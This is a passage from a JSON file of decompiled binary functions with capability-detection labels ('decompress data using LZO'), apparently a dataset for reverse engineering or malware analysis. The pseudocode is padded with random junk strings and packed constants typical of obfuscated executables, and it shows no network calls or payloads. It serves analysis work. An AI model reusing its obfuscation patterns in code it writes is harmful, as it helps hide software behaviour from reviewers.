  *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4) = 0;\n    iStack64 = param_1 + 0x28;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x38) = 0;\n    *(param_1 + 0x3c) = 0xf;\n    *(param_1 + 0x28) = 0;\n    iStack100 = param_1 + 0x48;\n    *(param_1 + 0x48) = 0;\n    *(param_1 + 0x58) = 0;\n    *(param_1 + 0x5c) = 0xf;\n    *(param_1 + 0x48) = 0;\n    piStack40 = &stack0xffffff40;\n    puStack44 = &stack0xffffff84;\n    uStack104 = 0xf;\n    uStack108 = 0;\n    auStack124[0] = 0;\n    puStack52 = &stack0xffffff5c;\n    uStack148 = 0;\n    uStack144 = 0xf;\n    auStack164[0] = 0;\n    uStack20 = 0xf;\n    iStack72 = param_1;\n    iStack60 = iStack100;\n    fcn.00402f72(0x24);\n    puVar2 = piStack40;\n    *piStack40 = 0;\n    puVar2[4] = 0;\n    puVar2[5] = 0xf;\n    *puVar2 = 0;\n    uStack20 = 0x10;\n    fcn.00402f72(0x3e, uStack36, \"ezcymwuadamvcyzkzoxknvsrnbzagyehnhxsknulbumhmxngpvjowfjvvvyuko\");\n    puVar2 = piStack40;\n    piStack40[6] = 0x495;\n    *(puVar2 + 0xd) = 1;\n    puVar2[0xf] = 0x40e52920;\n    puVar2[0xe] = 0;\n    *(puVar2 + 0x10) = 1;\n    puVar2[0x17] = 0x9ac;\n    uStack20 = 3;\n    uVar5 = fcn.00402acc();\n    puVar2 = puStack48;\n    puStack48[-1] = uVar5;\n    piStack40 = puVar2 + -0xf;\n    puVar2[-0xb] = 0;\n    puVar2[-7] = 0;\n    puVar2[-6] = 0xf;\n    *(puVar2 + -0xb) = 0;\n    puVar13 = puVar2 + -0x12;\n    *(puVar2 + -0x11) = uStack36;\n    puVar2[-0x10] = \"gximczatnkyspsxsohcptzfnyxpgawnskpxwobshmbibruiib\";\n    puVar2[-0x12] = 0x31;\n    puVar2[-0x13] = 0x43b134;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    *piStack40 = 0;\n    *(piVar3 + 1) = 1;\n    piVar3[2] = 0x13e5;\n    piVar3[3] = 0x11a7;\n    iVar1 = *0x5425fc;\n    iVar9 = *0x5425f8;\n    iVar8 = *0x5425f4;\n    piVar3[10] = *0x5425f0;\n    piVar3[0xb] = iVar8;\n    piVar3[0xc] = iVar9;\n    piVar3[0xd] = iVar1;\n    piVar3[0xe] = 0xd73;\n    uVar7 = piVar3[9];\n    if (0xf < uVar7) {\n        iVar8 = piVar3[4];\n        uVar6 = uVar7 + 1;\n        iVar9 = iVar8;\n        if (uVar6 < 0x1000) {\ncode_r0x0043b18c:\n            puVar2[-0x13] = uVar6;\n            puVar2[-0x14] = iVar9;\n            puVar2[-0x15] = 0x43b193;\n            uVar7 = fcn.00401a32(puVar2[-0x14]);\n            goto code_r0x0043b196;\n        }\n        iVar9 = *(iVar8 + -4);\n        if ((iVar8 + -4) - iVar9 < 0x20) {\n            uVar6 = uVar7 + 0x24;\n            goto code_r0x0043b18c;\n        }\n        uStack20 = 0;\n        puVar2[-0x13] = 0x43b8f6;\n        fcn.004047f5();\ncode_r0x0043b8f6:\n        uStack20 = 1;\n        puVar13[-1] = 0x43b902;\n        fcn.004047f5();\ncode_r0x0043b902:\n        uStack20 = 2;\n        *(puVar13 + -4) = 0x43b90e;\n        fcn.004047f5();\n        *(puVar13 + -4) = &stack0xfffffffc;\n        *(puVar13 + -0x78) = 0x43b91c;\n        fcn.004052d1();\n        *(puVar13 + -0x78) = &stack0x00000008;\n        *(puVar13 + -0xec) = 0x43b92c;\n        fcn.004052d1();\n        *(puVar13 + -0xec) = &stack0x00000014;\n        *(puVar13 + -0x160) = 0x43b93c;\n        fcn.004052d1();\n        *(puVar13 + -0x160) = &stack0x00000020;\n        *(puVar13 + -0x1d4) = 0x43b94f;\n        iVar8 = fcn.00403a76();\n        return iVar8;\n    }\ncode_r0x0043b196:\n    puVar2 = puStack48;\n    puStack48[-1] = uVar7;\n    piStack40 = puVar2 + -0xe;\n    puStack44 = puVar2 + -8;\n    puVar2[-8] = 0;\n    puVar2[-4] = 0;\n    puVar2[-3] = 0xf;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0x10) = uStack36;\n    puVar2[-0xf] = \"omuqytroypcvxlcezsadqysbolndqwglpqcbgxtudhbodcy\";\n    puVar2[-0x11] = 0x2f;\n    puVar2[-0x12] = 0x43b1df;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    *piStack40 = 0;\n    puVar13[4] = 0;\n    puVar13[5] = 0xf;\n    *puVar13 = 0;\n    uStack20 = 0xe;\n    *(puVar2 + -0x13) = uStack36;\n    puVar2[-0x12] = \"gyjxmjbhvsgntkthbfrjtomvqqzygyaoqltbkeqpoymuzvxoyauvfavrpuwdlnqkxpmxdaeqjgpwnmhw\";\n    puVar2[-0x14] = 0x50;\n    puVar2[-0x15] = 0x43b21e;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    piStack40[0xd] = 0x40d36dc0;\n    puVar13[0xc] = 0;\n    puVar2[-0x15] = 0x43b234;\n    uVar5 = fcn.00406398();\n    puVar2 = puStack48;\n    puVar10 = puStack48 + -1;\n    puStack48[-1] = uVar5;\n    piStack40 = puVar2 + -0x15;\n    puStack44 = puVar2 + -6;\n    puVar2[-6] = 0;\n    puVar2[-2] = 0;\n    *puVar10 = 0xf;\n    *(puVar2 + -6) = 0;\n    uStack20 = 3;\n    *(puVar2 + -0x17) = uStack36;\n    puVar2[-0x16] = \"ogytnoepkekglwnzmgavqmnbfqpntzvnywrcsxwfbainbgtgardsjvmbdqdomzkbhzafednmfi\";\n    puVar2[-0x18] = 0x4a;\n    puVar2[-0x19] = 0x43b284;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    piStack40[5] = 0;\n    piVar3[9] = 0;\n    piVar3[10] = 0xf;\n    *(piVar3 + 5) = 0;\n    uStack20 = 0xd;\n    *(puVar2 + -0x1a) = uStack36;\n    puVar2[-0x19] = \"nuuvfxbkyotweurlrzncjqrdtwpcilmpnahmhptrksphcbkuouenaahezgnsvhyfnadyanvquemavtzdhaos\";\n    puVar2[-0x1b] = 0x54;\n    puVar2[-0x1c] = 0x43b2ca;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    *piStack40 = &stack0xffffffa0;\n    piVar3[1] = 0xb04;\n    piVar3[3] = 0x40db4b00;\n    piVar3[2] = 0;\n    *(piVar3 + 4) = 1;\n    piVar3[0xb] = *0x542610;\n    piVar3[0xc] = *0x542614;\n    piVar3[0xd] = *0x542618;\n    piVar3[0xe] = *0x54261c;\n    uStack20 = 3;\n    puVar2[-0x1c] = 0x43b302;\n    fcn.004031d9();\n    puVar2 = puStack48;\n    uVar7 = uStack76;\n    if (0xf < uStack76) {\n        uVar7 = uStack76 + 1;\n        uVar6 = auStack96[0];\n        if (0xfff < uVar7) {\n            uVar6 = *(auStack96[0] - 4);\n            puVar13 = puStack48;\n            if (0x1f < (auStack96[0] - 4) - uVar6) goto code_r0x0043b8f6;\n            uVar7 = uStack76 + 0x24;\n        }\n        puStack48[-1] = uVar7;\n        puVar2[-2] = uVar6;\n        puVar2[-3] = 0x43b33a;\n        uVar7 = fcn.00401a32(puVar2[-2]);\n    }\n    uStack80 = 0;\n    uStack76 = 0xf;\n    auStack96[0] = auStack96[0] & 0xffffff00;\n    puStack48 = puVar2;\n    puVar2[-1] = uVar7;\n    piStack40 = puVar2 + -0x19;\n    puStack44 = puVar2 + -6;\n    puVar2[-6] = 0;\n    puVar2[-2] = 0;\n    puVar2[-1] = 0xf;\n    *(puVar2 + -6) = 0;\n    *(puVar2 + -0x1b) = uStack36;\n    puVar2[-0x1a] = \"nhpkgcintpwkmoiisrwzrchzjabdhuqnxvcixvvfaunnghktuvozlo\";\n    puVar2[-0x1c] = 0x36;\n    puVar2[-0x1d] = 0x43b398;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    puStack52 = piStack40 + 0xd;\n    piStack40[0xd] = 0;\n    puVar13[0x11] = 0;\n    puVar13[0x12] = 0xf;\n    *(puVar13 + 0xd) = 0;\n    uStack20 = 10;\n    *(puVar2 + -0x1e) = uStack36;\n    puVar2[-0x1d] = \"egzuywimdodzhjzvcftumjyxkebqqfzceznysxgquctjcrx\";\n    puVar2[-0x1f] = 0x2f;\n    puVar2[-0x20] = 0x43b3df;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    puStack56 = piStack40 + 7;\n    piStack40[7] = 0;\n    puVar13[0xb] = 0;\n    puVar13[0xc] = 0xf;\n    *(puVar13 + 7) = 0;\n    uStack20 = 0xb;\n    *(puVar2 + -0x21) = uStack36;\n    puVar2[-0x20] = \"xoselsslynvamrczyndesuhjzehhaia\";\n    puVar2[-0x22] = 0x1f;\n    puVar2[-0x23] = 0x43b428;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    *piStack40 = 0;\n    puVar13[4] = 0;\n    puVar13[5] = 0xf;\n    *puVar13 = 0;\n    uStack20 = 0xc;\n    *(puVar2 + -0x24) = uStack36;\n    puVar2[-0x23] = \"tvusfccgsredmjwistgkelwiifrmjiljjoeyejzaxklqhifhduokcelpfgarjy\";\n    puVar2[-0x25] = 0x3e;\n    puVar2[-0x26] = 0x43b467;\n    fcn.00402f72();\n    piStack40[6] = 0xc6e;\n    puVar2[-0x26] = 0x43b476;\n    uVar5 = fcn.00406870();\n    puVar2 = puStack48;\n    puStack48[-1] = uVar5;\n    piStack40 = puVar2 + -0x10;\n    puStack44 = puVar2 + -10;\n    puVar2[-10] = 0;\n    puVar2[-6] = 0;\n    puVar2[-5] = 0xf;\n    *(puVar2 + -10) = 0;\n    uStack20 = 3;\n    *(puVar2 + -0x12) = uStack36;\n    puVar2[-0x11] = \"svnhyyyhrectitageilbzkyixleysuppzpfcvhloktqdslyvbnienkjuwsbctcsnpmeqdzldnemlkgqognchpe\";\n    puVar2[-0x13] = 0x56;\n    puVar2[-0x14] = 0x43b4c6;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    *piStack40 = 0;\n    puVar13[4] = 0;\n    puVar13[5] = 0xf;\n    *puVar13 = 0;\n    uStack20 = 9;\n    *(puVar2 + -0x15) = uStack36;\n    puVar2[-0x14] = \"zjdpwqfwpvekvafkywsaxslspjbdgkldsohxppqlynvfyhckwtiaiikidgqhribfcm\";\n    puVar2[-0x16] = 0x42;\n    puVar2[-0x17] = 0x43b505;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    piStack40[0xc] = *0x542630;\n    puVar13[0xd] = *0x542634;\n    puVar13[0xe] = *0x542638;\n    puVar13[0xf] = *0x54263c;\n    uStack20 = 3;\n    puVar2[-0x17] = 0x43b51f;\n    uVar5 = fcn.00401785();\n    puVar2 = puStack48;\n    puVar11 = puStack48 + -1;\n    puStack48[-1] = uVar5;\n    piStack40 = puVar2 + -0xc;\n    puVar2[-6] = 0;\n    puVar2[-2] = 0;\n    *puVar11 = 0xf;\n    *(puVar2 + -6) = 0;\n    puVar13 = puVar2 + -0xf;\n    *(puVar2 + -0xe) = uStack36;\n    puVar2[-0xd] = \"fvsaxmlsjcvadyasxntltommj\";\n    puVar2[-0xf] = 0x19;\n    puVar2[-0x10] = 0x43b565;\n    fcn.00402f72();\n    piVar3 = piStack40;\n    piStack40[1] = 0x40c33600;\n    *piVar3 = 0;\n    *(piVar3 + 2) = 1;\n    piVar3[3] = 0x925;\n    piVar3[5] = 0x40ba1f00;\n    piVar3[4] = 0;\n    uVar7 = piVar3[0xb];\n    if (0xf < uVar7) {\n        iVar8 = piVar3[6];\n        uVar6 = uVar7 + 1;\n        iVar9 = iVar8;\n        if (0xfff < uVar6) {\n            iVar9 = *(iVar8 + -4);\n            if (0x1f < (iVar8 + -4) - iVar9) goto code_r0x0043b902;\n            uVar6 = uVar7 + 0x24;\n        }\n        puVar2[-0x10] = uVar6;\n        puVar2[-0x11] = iVar9;\n        puVar2[-0x12] = 0x43b5c3;\n        uVar7 = fcn.00401a32(puVar2[-0x11]);\n    }\n    puVar2 = puStack48;\n    puStack48[-1] = uVar7;\n    piStack40 = puVar2 + -0x1a;\n    puStack44 = puVar2 + -7;\n    puVar2[-2] = 0xf;\n    puVar2[-3] = 8;\n    *(puVar2 + -5) = 0;\n    puStack52 = puVar2 + -0xd;\n    puVar2[-0xd] = 0;\n    puVar2[-9] = *0x542650;\n    puVar2[-8] = *0x542654;\n    puVar2[-7] = str.peoowiwc._0_4_;\n    puVar2[-6] = str.peoowiwc._4_4_;\n    *(puVar2 + -0xd) = 0;\n    uStack20 = 6;\n    *(puVar2 + -0x1c) = uStack36;\n    puVar2[-0x1b] = \"cmsyzlwjmcpznuvcmcorpytltqqhvqnptwdscizbptwduqbgghksibd\";\n    puVar2[-0x1d] = 0x37;\n    puVar2[-0x1e] = 0x43b62b;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    puStack56 = piStack40 + 6;\n    piStack40[6] = 0;\n    puVar13[10] = 0;\n    puVar13[0xb] = 0xf;\n    *(puVar13 + 6) = 0;\n    uStack20 = 7;\n    *(puVar2 + -0x1f) = uStack36;\n    puVar2[-0x1e] = \"hpcjksngevjbspjdzmctxjcsskdcflbkktsflfcsdyqmdauywkyohbmofwmhsywhawwu\";\n    puVar2[-0x20] = 0x44;\n    puVar2[-0x21] = 0x43b674;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    *piStack40 = 0;\n    puVar13[4] = 0;\n    puVar13[5] = 0xf;\n    *puVar13 = 0;\n    uStack20 = 8;\n    *(puVar2 + -0x22) = uStack36;\n    puVar2[-0x21] = \"qdrgwfybkkbkfrdrnzfqetpzipfdzofxdbdzkyzbxnazbmbogwhlacaamndfphldhnbuqriwugvvgeuweaqvwyox\";\n    puVar2[-0x23] = 0x58;\n    puVar2[-0x24] = 0x43b6b3;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    *(piStack40 + 0xc) = 1;\n    *(puVar13 + 0x19) = 0;\n    uStack20 = 3;\n    puVar2[-0x24] = 0x43b6ca;\n    uVar5 = fcn.004064a6();\n    puVar2 = puStack48;\n    puStack48[-1] = uVar5;\n    piStack40 = puVar2 + -10;\n    puVar2[-9] = 0;\n    puVar2[-5] = 0;\n    puVar2[-4] = 0xf;\n    *(puVar2 + -9) = 0;\n    *(puVar2 + -0xc) = uStack36;\n    puVar2[-0xb] = \"rlcqbktlnokvazyokvabhueawbkkog\";\n    puVar2[-0xd] = 0x1e;\n    puVar2[-0xe] = 0x43b710;\n    fcn.00402f72();\n    puVar4 = piStack40;\n    *piStack40 = 0;\n    *(puVar4 + 0x20) = 0x40df25c0;\n    *(puVar4 + 0x1c) = 0;\n    *(puVar4 + 0x24) = 0x122d;\n    puVar2[-0xe] = 0x43b730;\n    fcn.00402423();\n    puVar2 = puStack48;\n    puVar12 = puStack48 + -1;\n    puStack48[-1] = 0x30;\n    puVar2[-2] = 0x43b73a;\n    uVar5 = fcn.004024b9(*puVar12, *puVar2);\n    puVar2[-1] = 0x30;\n    puVar2[-2] = uVar5;\n    puVar2[-3] = 0x43b745;\n    fcn.00401a32(puVar2[-2]);\n    piStack40 = puVar2 + -0x1c;\n    puStack44 = puVar2 + -8;\n    puStack48 = puVar2;\n    puVar2[-8] = 0;\n    puVar2[-4] = 0;\n    puVar2[-3] = 0xf;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0x1e) = uStack36;\n    puVar2[-0x1d] = \"mavyhcjhmmducyygugaxsupujibymkdbxupgrpodnbbureswcptplmcv\";\n    puVar2[-0x1f] = 0x38;\n    puVar2[-0x20] = 0x43b790;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    puStack52 = piStack40 + 0xd;\n    piStack40[0xd] = 0;\n    puVar13[0x11] = 0;\n    puVar13[0x12] = 0xf;\n    *(puVar13 + 0xd) = 0;\n    uStack20 = 4;\n    *(puVar2 + -0x21) = uStack36;\n    puVar2[-0x20] =\n         \"cwujcvibonuwokspnaqfukavioekrfpsxnqhyptfssdmzlvxsbqrgzzbhtsoyobtlopprighisoxunsmqowltwhoytztwpuifyps\";\n    puVar2[-0x22] = 100;\n    puVar2[-0x23] = 0x43b7d7;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    piStack40[7] = 0;\n    puVar13[0xb] = 0;\n    puVar13[0xc] = 0xf;\n    *(puVar13 + 7) = 0;\n    uStack20 = 5;\n    *(puVar2 + -0x24) = uStack36;\n    puVar2[-0x23] = \"wekfypfxetiaepmxnubmurrfxyonnnfttvfkvfwnk\";\n    puVar2[-0x25] = 0x29;\n    puVar2[-0x26] = 0x43b81d;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    *piStack40 = 0x951;\n    *(puVar13 + 1) = 0;\n    *(puVar13 + 2) = 1;\n    puVar13[3] = *0x542670;\n    puVar13[4] = *0x542674;\n    puVar13[5] = *0x542678;\n    puVar13[6] = *0x54267c;\n    *(puVar13 + 0x13) = 0;\n    puVar13[0x1b] = 0x40d7df40;\n    puVar13[0x1a] = 0;\n    puVar2[-0x26] = 0x43b850;\n    uVar5 = fcn.00406514();\n    puVar2 = puStack48;\n    puStack48[-1] = uVar5;\n    piStack40 = puVar2 + -0x12;\n    puVar2[-0xc] = 0;\n    puVar2[-8] = 0;\n    puVar2[-7] = 0xf;\n    *(puVar2 + -0xc) = 0;\n    uStack20 = 3;\n    *(puVar2 + -0x14) = uStack36;\n    puVar2[-0x13] = \"xjesyivjvxtuhltvgwtljpnmzyjflwnnyaliigehfhwqhqdzluzietcnjgfndqdxdcbcbxzbpeudvzmhaidj\";\n    puVar2[-0x15] = 0x54;\n    puVar2[-0x16] = 0x43b89d;\n    fcn.00402f72();\n    puVar13 = piStack40;\n    piStack40[1] = 0x40ea8b20;\n    *puVar13 = 0;\n    puVar13[2] = *0x542690;\n    puVar13[3] = *0x542694;\n    puVar13[4] = *0x542698;\n    puVar13[5] = *0x54269c;\n    puVar13[0xc] = *0x5426b0;\n    puVar13[0xd] = *0x5426b4;\n    puVar13[0xe] = *0x5426b8;\n    puVar13[0xf] = *0x5426bc;\n    puVar13[0x11] = 0x40f0b310;\n    puVar13[0x10] = 0;\n    puVar2[-0x16] = 0x43b8d6;\n    fcn.00403ec2();\n    *in_FS_OFFSET = iStack28;\n    return iStack72;\n}\n",
        "token_count": 7098
    },
    "0043bd80": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.0043bd80(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t aiStack152 [4];\n    uint uStack136;\n    uint32_t uStack132;\n    int32_t iStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    int32_t *piStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    uint *puStack60;\n    int32_t iStack56;\n    int32_t in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack60 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c980;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    param_1[5] = 0xf;\n    param_1[4] = 9;\n    *param_1 = 0x7a646868;\n    param_1[1] = 0x6d6e706f;\n    *(param_1 + 2) = 0x6a;\n    if (in_stack_00000030 < 0x10) {\ncode_r0x0043be08:\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    iStack56 = in_stack_0000001c;\n    if ((in_stack_00000030 + 1 < 0x1000) ||\n       (iStack56 = *(in_stack_0000001c + -4),  (in_stack_0000001c + -4) - iStack56 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack56);\n        goto code_r0x0043be08;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    piStack76 = aiStack152;\n    uStack68 = 0x44c990;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack136 = 0;\n    uStack132 = 0xf;\n    aiStack152[0] = 0;\n    uStack64 = 6;\n    fcn.00402f72(0x46, iStack104, \"kpjqbkzsnausgurquzbavydxpuswhneunsqrtdzpclfjrfikixsncvpemmsdkmroeasubh\");\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack64 = 7;\n    fcn.00402f72(0x46, iStack128, \"kpjqbkzsnausgurquzbavydxpuswhneunsqrtdzpclfjrfikixsncvpemmsdkmroeasubh\");\n    uStack112 = 0;\n    uStack108 = 0xf;\n    iStack128 = 0;\n    uStack64 = 8;\n    fcn.00402f72(0x46, uStack80, \"kpjqbkzsnausgurquzbavydxpuswhneunsqrtdzpclfjrfikixsncvpemmsdkmroeasubh\");\n    if (uStack108 < 0x10) {\ncode_r0x0043bf6b:\n        if (0xf < uStack84) {\n            iVar2 = iStack104;\n            if ((0xfff < uStack84 + 1) && (iVar2 = *(iStack104 + -4),  0x1f < (iStack104 + -4) - iVar2))\n            goto code_r0x0043c0c4;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack132) {\n            iVar2 = aiStack152[0];\n            if ((0xfff < uStack132 + 1) && (iVar2 = *(aiStack152[0] + -4),  0x1f < (aiStack152[0] + -4) - iVar2))\n            goto code_r0x0043c0d0;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack20) {\n            iVar2 = in_stack_ffffffd8;\n            if ((0xfff < uStack20 + 1) && (iVar2 = *(in_stack_ffffffd8 + -4),  0x1f < (in_stack_ffffffd8 + -4) - iVar2))\n            goto code_r0x0043c0dc;\n            fcn.00401a32(iVar2);\n        }\n        uStack24 = 0;\n        uStack20 = 0xf;\n        if (0xf < param_1) {\n            iVar2 = unaff_ESI;\n            if ((0xfff < param_1 + 1U) && (iVar2 = *(unaff_ESI + -4),  0x1f < (unaff_ESI + -4) - iVar2))\n            goto code_r0x0043c0e8;\n            fcn.00401a32(iVar2);\n        }\n        param_1 = 0xf;\n        if (0xf < in_stack_00000030) {\n            iVar2 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar2 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar2)) goto code_r0x0043c0f4;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack72;\n        return piStack72;\n    }\n    iVar2 = iStack128;\n    if ((uStack108 + 1 < 0x1000) || (iVar2 = *(iStack128 + -4),  (iStack128 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043bf6b;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x0043c0c4:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x0043c0d0:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x0043c0dc:\n    uStack64 = 3;\n    fcn.004047f5();\ncode_r0x0043c0e8:\n    uStack64 = 4;\n    fcn.004047f5();\ncode_r0x0043c0f4:\n    uStack64 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1702
    },
    "0043ca20": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0043ca20(void)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h;\n    uint32_t unaff_EBX;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    uint uStack188;\n    uchar uStack184;\n    char *pcStack180;\n    int32_t iStack176;\n    uint uStack160;\n    uint32_t uStack156;\n    int32_t iStack152;\n    uint uStack136;\n    uint32_t uStack132;\n    int32_t iStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c9d0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000028 < 0x10) {\ncode_r0x0043ca84:\n        *in_FS_OFFSET = piStack28;\n        return 0x9a0b;\n    }\n    iStack60 = in_stack_00000014;\n    if ((in_stack_00000028 + 1 < 0x1000) ||\n       (iStack60 = *(in_stack_00000014 + -4),  (in_stack_00000014 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x0043ca84;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack76 = &uStack188;\n    uStack68 = 0x44c9e0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack160 = 0;\n    uStack156 = 0xf;\n    iStack176 = 0;\n    uStack64 = 5;\n    uStack184 = iStack128;\n    pcStack180 = \"vowzmkbhvsbvuvkqnfehghgfjpmkaedtkkxlkohkyrebxeewxfuupwleoeeubihpeehpsouodkyhyftadlaqtaprierrpgjouu\";\n    uStack188 = 0x62;\n    fcn.00402f72();\n    uStack112 = 0;\n    uStack108 = 0xf;\n    iStack128 = 0;\n    uStack64 = 6;\n    fcn.00402f72(0x30, iStack104, \"eyehsmnlffmguubjhbvyduqnhcuyzznwwvolarrthxyfdffp\");\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack64 = 7;\n    fcn.00402f72(0x30, iStack152, \"eyehsmnlffmguubjhbvyduqnhcuyzznwwvolarrthxyfdffp\");\n    uStack136 = 0;\n    uStack132 = 0xf;\n    iStack152 = 0;\n    uStack64 = 8;\n    fcn.00402f72(0x30, uStack80, \"eyehsmnlffmguubjhbvyduqnhcuyzznwwvolarrthxyfdffp\");\n    if (uStack132 < 0x10) {\ncode_r0x0043cc2e:\n        if (0xf < uStack84) {\n            iVar1 = iStack104;\n            if ((0xfff < uStack84 + 1) && (iVar1 = *(iStack104 + -4),  0x1f < (iStack104 + -4) - iVar1))\n            goto code_r0x0043cd3f;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack108) {\n            iVar1 = iStack128;\n            if ((0xfff < uStack108 + 1) && (iVar1 = *(iStack128 + -4),  0x1f < (iStack128 + -4) - iVar1))\n            goto code_r0x0043cd4b;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack156) {\n            iVar1 = iStack176;\n            if ((0xfff < uStack156 + 1) && (iVar1 = *(iStack176 + -4),  0x1f < (iStack176 + -4) - iVar1))\n            goto code_r0x0043cd57;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < unaff_EBX) {\n            arg_8h = piStack28;\n            if ((0xfff < unaff_EBX + 1) && (arg_8h = piStack28[-1],  0x1f < piStack28 + (-4 - arg_8h)))\n            goto code_r0x0043cd63;\n            fcn.00401a32(arg_8h);\n        }\n        *in_FS_OFFSET = piStack72;\n        return piStack72;\n    }\n    iVar1 = iStack152;\n    if ((uStack132 + 1 < 0x1000) || (iVar1 = *(iStack152 + -4),  (iStack152 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043cc2e;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x0043cd3f:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x0043cd4b:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x0043cd57:\n    uStack64 = 3;\n    fcn.004047f5();\ncode_r0x0043cd63:\n    uStack64 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 1543
    },
    "0043ce40": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.0043ce40(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint *puVar12;\n    int32_t *in_FS_OFFSET;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint8_t uStack236;\n    char *pcStack232;\n    uchar *puStack228;\n    uchar uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uchar uStack208;\n    uchar uStack204;\n    uint uStack200;\n    uint uStack188;\n    uint32_t uStack184;\n    char *pcStack180;\n    char *pcStack176;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack144;\n    uint32_t uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    int32_t iStack128;\n    uint32_t uStack108;\n    uint32_t uStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uint32_t uStack80;\n    uint uStack76;\n    ushort uStack72;\n    uint uStack64;\n    uint32_t uStack60;\n    uint uStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    uint *puStack40;\n    uint8_t uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    uint32_t *puVar11;\n    \n 